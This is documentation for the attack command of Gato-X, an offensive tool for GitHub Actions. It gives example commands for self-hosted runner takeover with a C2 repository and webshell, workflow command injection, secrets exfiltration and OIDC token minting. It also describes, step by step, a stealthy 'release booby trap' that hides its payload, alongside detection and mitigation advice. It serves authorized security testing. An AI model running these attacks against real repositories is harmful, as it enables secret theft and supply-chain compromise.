# Attack Command

The attack command provides capabilities to exploit vulnerabilities in GitHub Actions workflows. This includes self-hosted runner takeover using the Runner-on-Runner (RoR) technique, workflow injection attacks, and secrets exfiltration.

> **Warning**: These features should only be used with proper authorization and for ethical security research purposes.

## Basic Usage

```bash
gato-x attack [options]
# or
gato-x a [options]
```

## Options

### General Options

| Option | Description |
|--------|-------------|
| `--target`, `-t` | Repository to target in attack (ORG/REPO format) |
| `--author-name`, `-a` | Name of the author for git commits |
| `--author-email`, `-e` | Email for git commits |
| `--branch`, `-b` | Target branch for the attack |
| `--message`, `-m` | Commit message to use |
| `--timeout`, `-to` | Timeout in seconds to wait for workflow execution |

### Attack Mode Options

| Option | Description |
|--------|-------------|
| `--workflow`, `-w` | Attack by pushing a workflow to a feature branch |
| `--runner-on-runner`, `-pr` | Attack with Runner-on-Runner via a Fork Pull Request |
| `--secrets`, `-sc` | Attack to exfiltrate pipeline secrets |
| `--oidc`, `-oi` | Attack to mint a GitHub Actions OIDC token for a chosen audience |
| `--interact` | Connect to a C2 repository and interact with connected runners |
| `--payload-only` | Generate payloads for manually deploying runner on runner |
| `--release-booby-trap`, `-rbt` | Plant a dormant workflow behind a release that fires when a maintainer edits it |

### Release Booby Trap Options

| Option | Description |
|--------|-------------|
| `--booby-payload`, `-bp` | Path to a custom workflow YAML to plant. Defaults to a built-in OIDC-exfiltration template |
| `--booby-publish` | Publish the release rather than leaving it as a draft |
| `--dry-run` | Show each API call that would be made without performing the attack |

### Workflow Attack Options

| Option | Description |
|--------|-------------|
| `--command`, `-c` | Command to execute as part of payload |
| `--name`, `-n` | Name of the workflow |
| `--file-name`, `-fn` | Name of yaml file without extension |
| `--custom-file`, `-f` | Path to a yaml workflow to upload |
| `--delete-run`, `-d` | Delete the resulting workflow run |

### OIDC Attack Options

| Option | Description |
|--------|-------------|
| `--oidc-audience`, `-oa` | OIDC audience value for the token request. Defaults to `sigstore` |
| `--environments`, `-ev` | One or more GitHub Actions environments to mint tokens for (uses a job matrix) |
| `--runner-override`, `-ro` | Runner labels to use instead of `ubuntu-latest` |
| `--file-name`, `-fn` | Required for OIDC attacks — name of the workflow yaml without extension |

### Runner-on-Runner Options

| Option | Description |
|--------|-------------|
| `--source-branch`, `-sb` | Name of the PR source branch |
| `--pr-title`, `-pt` | Name of the PR that will be created |
| `--target-os` | Operating system for Runner-on-Runner attack (windows, linux, osx) |
| `--target-arch` | Architecture for Runner-on-Runner attack (arm, arm64, x64) |
| `--labels` | List of labels to request for self-hosted runner attacks |
| `--keep-alive` | Keep the workflow running after deploying a RoR |
| `--c2-repo` | Name of an existing Gato-X C2 repository in Owner/Repo format |

## Examples

### Perform Self-Hosted Runner Takeover

```bash
gato-x a --runner-on-runner --target MyOrg/MyRepo --target-os linux --target-arch x64
```

### Push a Workflow to Execute a Command

```bash
gato-x a --workflow --target MyOrg/MyRepo --command "whoami"
```

### Exfiltrate Secrets

```bash
gato-x a --secrets --target MyOrg/MyRepo
```

### Mint an OIDC Token for a Third-Party Audience

```bash
gato-x a --oidc -oa "npm:registry.npmjs.org" -t MyOrg/MyRepo --file-name release -d -ev "NPM | CLI" "Production"
```

This requests an OIDC token from each listed environment and prints the token plus its decoded claims. See [OIDC Token Exchange](../advanced/oidc.md) for details on how the token can be used after the workflow finishes.

### Generate Runner-on-Runner Payload Only

```bash
gato-x a --payload-only --target-os linux --target-arch x64
```

### Interact with an Existing C2 Repository

```bash
gato-x a --interact --c2-repo MyOrg/C2Repo
```

### Plant a Release Booby Trap

```bash
gato-x attack -t org/repo --release-booby-trap --dry-run
```

Drop `--dry-run` to perform it, and add `--booby-publish` to publish the
release instead of leaving a draft. A custom payload can be supplied with
`--booby-payload ./my-workflow.yml`.

## Release Booby Trap Attack Process

This technique requires `contents: write` on the target.

1. An orphan commit is built through the Git Data API that tree-splices a
   workflow into `.github/workflows/`. The workflow listens on
   `release: [edited, deleted]`.
2. A draft release is created pointing at a clean commit on the default
   branch, then PATCHed to the orphan SHA and published. The PATCH avoids the
   workflow-scope check GitHub applies at release *creation*.
3. GitHub's loop prevention suppresses the immediate dispatch, so the release
   sits dormant and nothing runs.
4. When any non-bot actor interacts with the release, `release: edited` fires
   without loop prevention and the planted workflow executes.

Because the payload lives on an orphan commit, it never appears on the default
branch and is not visible in the ordinary commit history.

### Detection and mitigation

- Audit releases whose `target_commitish` does not reach the default branch.
- Alert on workflow runs whose workflow file is absent from the branch head.
- Require `actions: write` review for release automation, and restrict
  `contents: write` for third-party apps and tokens.
- Review the Git Data API audit log for blob/tree/commit creation that is not
  followed by a ref update.

## Runner-on-Runner Attack Process

When executing a Runner-on-Runner attack, Gato-X performs the following steps:

1. Prepare a C2 repository for command and control
2. Prepare payload Gist files
3. Deploy the RoR implantation payload
4. Confirm successful callback and runner installation
5. Provide an interactive webshell upon successful connection

## Security Considerations

- Always ensure you have proper authorization before using attack features
- Use these features only for ethical security research
- Follow responsible disclosure practices when finding vulnerabilities
